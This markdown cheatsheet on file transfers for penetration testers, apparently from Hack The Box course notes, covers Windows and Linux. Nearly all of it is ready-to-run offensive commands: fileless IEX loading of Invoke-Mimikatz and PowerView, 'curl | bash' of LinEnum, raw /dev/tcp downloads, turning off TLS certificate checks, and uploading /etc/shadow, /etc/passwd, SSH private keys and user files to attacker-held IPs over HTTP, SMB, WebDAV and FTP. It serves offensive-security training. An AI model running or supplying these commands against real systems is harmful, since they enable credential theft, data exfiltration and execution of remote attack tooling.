[File transfer cheatsheet](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)<br>
[File transfer cheatsheet 2](https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/)
# File Transfers
## Windows File Transfers
### Powershell Base64 Enconde & Decode
Encode
```
cat id_rsa |base64 -w 0;echo
```
Decode
```
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<Base64-String>"))
```
### Powershell Web Downloads

| Method	| Description|
|---------|-----------|
| OpenRead	| Returns the data from a resource as a Stream.| 
| OpenReadAsync	| Returns the data from a resource without blocking the calling thread.| 
| DownloadData	| Downloads data from a resource and returns a Byte array.| 
| DownloadDataAsync	| Downloads data from a resource and returns a Byte array without blocking the calling thread.| 
| DownloadFile	| Downloads data from a resource to a local file.| 
| DownloadFileAsync	| Downloads data from a resource to a local file without blocking the calling thread.| 
| DownloadString	| Downloads a String from a resource and returns a String.| 
| DownloadStringAsync	| Downloads a String from a resource without blocking the calling thread.| 

### PowerShell DownloadFile Method
```
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

### Powershell DownloadString - Fileless Method
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
Pipeline Input
```
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
### Powershell Invoke-WebRequest
```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
### Common Errors
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
Create SMB Server
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
Copy a File from the SMB Server
```
copy \\192.168.220.133\share\nc.exe
```
Create the SMB Server with a Username and Password
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
Mount the SMB Server with Username and Password
```
net use n: \\192.168.220.133\share /user:test test
```
### FTP Downloads
Installing the FTP Server Python3 Module - pyftpdlib
```
sudo pip3 install pyftpdlib
```
Setting up a Python3 FTP Server
```
sudo python3 -m pyftpdlib --port 21
```
Transfering Files from an FTP Server Using PowerShell
```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```
Create a Command File for the FTP Client and Download the Target File
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
## Upload Operations
### PowerShell Base64 Encode & Decode
Encoding
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
Decoding
```
echo <Base64-String> | base64 -d > hosts
```
### PowerShell Web Uploads
Installing a Configured WebServer with Upload
```
pip3 install uploadserver
```
```
python3 -m uploadserver
```
PowerShell Script to Upload a File to Python Upload Server
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
PowerShell Base64 Web Upload
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```
nc -lvnp 8000
```
### SMB Uploads
Configuring WebDav Server
Installing WebDav Python Modules
```
sudo pip install wsgidav cheroot
```
Using the WebDav Python module
```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
Connecting to the Webdav Share
```
dir \\192.168.49.128\DavWWWRoot
```
Uploading Files using SMB
```
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
### FTP Uploads
Uploading Files using SMB
```
sudo python3 -m pyftpdlib --port 21 --write
```
PowerShell Upload File
```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
Create a Command File for the FTP Client to Upload a File
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

## Linux File Transfers
### Download Operations
Base64 Encoding / Decoding
Encoding
```
cat id_rsa |base64 -w 0;echo
```
Decoding
```
echo -n '<base64-string>' | base64 -d > id_rsa
```
### Web Downloads with Wget and cURL
Download a File Using wget
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
Download a File Using cURL
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
### Fileless Attacks Using Linux
```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
Fileless Download with wget
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
### Download with Bash (/dev/tcp)
Connect to the Target Webserver
```
exec 3<>/dev/tcp/10.10.10.32/80
```
HTTP GET Request
```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
Print the Response
```
cat <&3
```
### SSH Downloads
Enabling the SSH Server
```
sudo systemctl enable ssh
```
Starting the SSH Server
```
sudo systemctl start ssh
```
Checking for SSH Listening Port
```
netstat -lnpt
```
Linux - Downloading Files Using SCP
```
scp plaintext@192.168.49.128:/root/myroot.txt .
```
## Upload Operations
### Web Upload
Pwnbox - Start Web Server
```
sudo python3 -mpip install --user uploadserver
```
Pwnbox - Create a Self-Signed Certificate
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
Pwnbox - Start Web Server
```
mkdir https && cd https
```
```
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
Linux - Upload Multiple Files
```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
### Alternative Web File Transfer Method
Linux - Creating a Web Server with Python3
```
python3 -m http.server
```
Linux - Creating a Web Server with Python2.7
```
python2.7 -m SimpleHTTPServer
```
Linux - Creating a Web Server with PHP
```
php -S 0.0.0.0:8000
```
Linux - Creating a Web Server with Ruby
```
ruby -run -ehttpd . -p8000
```
Download the File from the Target Machine onto the Pwnbox
```
wget 192.168.49.128:8000/filetotransfer.txt
```
### SCP Upload
File Upload using SCP
```
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```
[File transfer cheatsheet](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
